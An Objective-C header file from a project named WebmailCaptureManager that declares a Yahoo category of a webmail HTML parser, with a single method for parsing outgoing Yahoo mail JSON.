//
//  WebmailHTMLParser+Yahoo.h
//  WebmailCaptureManager
//
//  Created by Makara Khloth on 11/7/16.
//  Copyright © 2016 ophat. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "WebmailHTMLParser.h"

@interface WebmailHTMLParser (Yahoo)

+ (void) parseYahoo_OugoingJSON: (NSString *) aJSON app: (NSString *) aAppName;

@end
